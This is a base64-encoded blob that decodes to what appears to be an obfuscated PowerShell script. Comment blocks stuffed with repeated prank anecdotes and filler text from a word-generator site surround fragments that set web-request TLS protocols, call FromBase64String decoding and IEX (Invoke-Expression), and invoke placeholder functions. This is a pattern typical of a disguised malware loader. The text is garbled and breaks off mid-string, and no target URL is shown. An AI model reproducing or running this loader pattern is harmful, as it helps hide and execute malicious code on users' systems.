pbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxJIHdhcyBhdCBhIHN3YW5rIGJhciBmb3IgYSB3b3JrIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLCBlKCkgc29tZSBncmFkIHN0dWRlbnRzIHdlIGooKSBmb3IgYW4gaCgpIHByb2dyYW0uIEFmdGVyIHdlIGhhZCBhbGwgaGFkIGsoKSBkcmlua3MsIG9uZSBvZiB0aGUgc3R1ZGVudHMgc2FpZCB0aGV5IGRvbnQgbGlrZSBzbW9rZXMgYmVjYXVzZSB0aGV5IHRhc3RlIGxpa2UgYS4gTXkgYm9zcyByZXBsaWVkLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIHNtb2tlcy4gU28gSSBjdXQgaW4sIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2QgYS4gSSB3YXMgYXNrZWQgdG8gbGVhdmUu4oCdU291cmNlIz4KPCNUaGF0cyBEZWRpY2F0aW9uU291cmNlIE9uZSB0aW1lIEkgYXRlIDI2IGNob2NvbGF0ZSBjaGlwIGkoKSBiZWNhdXNlIEkgd2FzIG1hZCBhdCBteSBsaXR0bGUgbCgpIGFuZCBkaWRudCB3YW50IGhlciB0byBoYXZlIGFueS4gSSBwdWtlZCBhbGwgb3ZlciB0aGUgcGxhY2Uu4oCdIFNvdXJjZSM+Cjwj4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgbigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiByIHsKCSNieSBkZWZhdWx0IFBvd2VyU2hlbGwgd2lsbCBzaG93IFNzbDMsIFRscyAtIHNpbmNlIFNTTDMgaXMgbm90IGRlc2lyYWJsZSB3ZSB3aWxsIGRyb3AgaXQgYW5kIHVzZSBUbHMgKyBUbHMxMgoJW1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgPSBbU3lzdGVtLk5ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRscyAtYm9yIFtTeXN0ZW0uTmV0LlNlY3VyaXR5UHJvdG9jb2xUeXBlXTo6VGxzMTIKfQo8Iz4+ClNwPWVsbGluZyBhbmQgVm9jYWJ1bGFyeQpUaGlzIHRvb2wgY2FuIGJlIGFuIGV4Y2VsbGVudCB3YXkgdG8gaW1wcm92ZSB2b2NhYnVsYXJ5IG9yIHByYWN0aWNlIGZvciByKCkgYmVlcy4gSWYgYW4gcSgpIHdvcmQgbygpLCBwKCkgdXAgdGhlIG1lYW5pbmcgd2lsbCBoZWxwIHN0dWRlbnRzIGluY3JlYXNlIHRoZSBudW1iZXIgb2Ygd29yZHMgdGhleSBrbm93LiBXb3JraW5nIHdpdGggYSBwYXJ0bmVyLCBzdHVkZW50cyBjYW4gdGVzdCBlYWNoIG90aGVyIG9uIHRoZSByKCkgZm9yIHRoZSByYW5kb21pemVkIHdvcmRzIG0oKWQuCgpOYW1lIEluc3BpcmF0aW9uCklmIHlvdSBuZWVkIHRvIGNyZWF0ZSBhIG5hbWUgZm9yIGEgcHJvZHVjdCwgYW4gZXZlbnQsIGEgYmFuZCBvciBmb3IgYW55dGhpbmcgZWxzZSwgdGhpcyB0b29sIGNhbiBiZSBxdWl0ZSBoZWxwZnVsLiBBcyB5b3UgY29uc2lkZXIgbmFtZXMsIG0oKSBhIG51bWJlciBvZiByYW5kb20gd29yZHMgYW5kIHNlZSBob3cgdGhleSBpbXBhY3Qgd2hhdCB5b3UgaGF2ZSBhbHJlYWR5IGNvbWUgdXAgd2l0aC4gSW5wdXR0aW5nIHVuaXF1ZSB3b3JkcyB5b3UgbWF5IG5vdCBoYXZlIGNvbnNpZGVyZWQgY2FuIHNwYXJrIGFkZGl0aW9uYWwgY3JlYXRpdml0eSB0byBldmVudHVhbGx5IGhlbHAgeW91IHByb2R1Y2UgdGhlIHBlcmZlY3QgbmFtZSBmb3IgeW91ciBwcm9qZWN0LiBJZiB5b3UncmUgcCgpIGZvciBnb29kIGNoYXJhY3RlciBuYW1lcyBvciBiYWJ5IG5hbWVzLCB5b3UgbWlnaHQgYmUgaW50ZXJlc3RlZCBpbiBvdXIgcmFuZG9tIG5hbWUgZ2VuZXJhdG9yLgoKVGhlIGFib3ZlIGxpc3QgaXMgbm90IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLiBUaGVyZSBhcmUgbGl0ZXJhbGx5IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIG9mIHdheXMgdGhlIFJhbmRvbSBXb3JkIEdlbmVyYXRvciBjYW4gYmUgdXNlZC4gUGxlYXNlIGZlZWwgZnJlZSB0byBzaGFyZSB0aGUgd2F5IHlvdSB1c2UgdGhpcyB0b29sLCBhbmQgd2UgYWx3YXlzIHdlbGNvbWUgc3VnZ2VzdGlvbnMgb24gaG93IHdlIGNhbiBpbXByb3ZlIGl0IHRvIHNlcnZlIHlvdSBiZXR0ZXIuIFdlIGFyZSBhbHNvIGludGVyZXN0ZWQgaW4gbmV3IHdvcmQgZ2VuZXJhdG9ycyB5b3UnZCBiZSBpbnRlcmVzdGVkIGluIHVzIGNyZWF0aW5nLiBNYW55IG9mIHRoZSB0b29scyBvbiB0aGlzIHdlYnNpdGUgY2FtZSBmcm9tIGlkZWFzIGZyb20gcGVvcGxlIGxpa2UgeW91IHdobyBjb250YWN0ZWQgdXMuIFBsZWFzZSB0YWtlIHRoZSB0aW1lIHRvIGV4cGxvcmUgdGhlIG90aGVyIHJhbmRvbSBnZW5lcmF0b3JzIHdlIGhhdmUgYXZhaWwKCiM+PCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgbigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBuKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIGUoKSBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBoKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIERlZGljYXRpb25Tb3VyY2UgT25lIHRpbWUgSSBhdGUgMjYgY2hvY29sYXRlIGNoaXAgaSgpIGJlY2F1c2UgSSB3YXMgbWFkIGF0IG15IGxpdHRsZSBsKCkgYW5kIGRpZG50IHdhbnQgaGVyIHRvIGhhdmUgYW55LiBJIHB1a2VkIGFsbCBvdmVyIHRoZSBwbGFjZS7igJ0gU291cmNlIz4KPCPigJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBuKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CmZ1bmN0aW9uIHIgewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBBUkFNKCAKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtzdHJpbmddJGZpbGVQYXRoCiAgICApCiAgICAkbG9nZmlsZW5hbWUgPSAiTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5WZXJib3NlLmxvZyIKICAgIGlmKC1ub3QgW3N0cmluZ106OklzTnVsbE9yRW1wdHkoJGZpbGVQYXRoKSl7CiAgICAgICAgJGxvZ2ZpbGVuYW1lID0gIiRmaWxlUGF0aFwkbG9nZmlsZW5hbWUiCiAgICB9CiAgICBXcml0ZS1WZXJib3NlICJFbmFibGluZyBNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yIHZlcmJvc2UgbG9nZ2luZyB0byAkbG9nZmlsZW5hbWUiCiAgICBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5UcmFjZUNvbnRyb2xTZXR0aW5nc106OlRyYWNlTGV2ZWwgPSBbU3lzdGVtLkRpYWdub3N0aWNzLlNvdXJjZUxldmVsc106OkFsbAogICAgaWYoLW5vdCBbTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5UcmFjZUNvbnRyb2xTZXR0aW5nc106OkFkZFRyYWNlTGlzdGVuZXIoKE5ldy1PYmplY3QgU3lzdGVtLkRpYWdub3N0aWNzLlRleHRXcml0ZXJUcmFjZUxpc3RlbmVyIC1Bcmd1bWVudExpc3QgJGxvZ2ZpbGVuYW1lKSkpewogICAgICAgIFdyaXRlLVdhcm5pbmcgIk1pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuVHJhY2VDb250cm9sU2V0dGluZ3NdOjpBZGRUcmFjZUxpc3RlbmVyIGZvciBhbGwgbGV2ZWxzIGZhaWxlZC4iCiAgICB9Cn0KPCM+PgpTcD1lbGxpbmcgYW5kIFZvY2FidWxhcnkKVGhpcyB0b29sIGNhbiBiZSBhbiBleGNlbGxlbnQgd2F5IHRvIGltcHJvdmUgdm9jYWJ1bGFyeSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCgojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIG4oKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgbigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxJIHdhcyBhdCBhIHN3YW5rIGJhciBmb3IgYSB3b3JrIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLCBlKCkgc29tZSBncmFkIHN0dWRlbnRzIHdlIGooKSBmb3IgYW4gaCgpIHByb2dyYW0uIEFmdGVyIHdlIGhhZCBhbGwgaGFkIGsoKSBkcmlua3MsIG9uZSBvZiB0aGUgc3R1ZGVudHMgc2FpZCB0aGV5IGRvbnQgbGlrZSBzbW9rZXMgYmVjYXVzZSB0aGV5IHRhc3RlIGxpa2UgYS4gTXkgYm9zcyByZXBsaWVkLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIHNtb2tlcy4gU28gSSBjdXQgaW4sIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2QgYS4gSSB3YXMgYXNrZWQgdG8gbGVhdmUu4oCdU291cmNlIz4KPCNUaGF0cyBEZWRpY2F0aW9uU291cmNlIE9uZSB0aW1lIEkgYXRlIDI2IGNob2NvbGF0ZSBjaGlwIGkoKSBiZWNhdXNlIEkgd2FzIG1hZCBhdCBteSBsaXR0bGUgbCgpIGFuZCBkaWRudCB3YW50IGhlciB0byBoYXZlIGFueS4gSSBwdWtlZCBhbGwgb3ZlciB0aGUgcGxhY2Uu4oCdIFNvdXJjZSM+Cjwj4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgbigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbi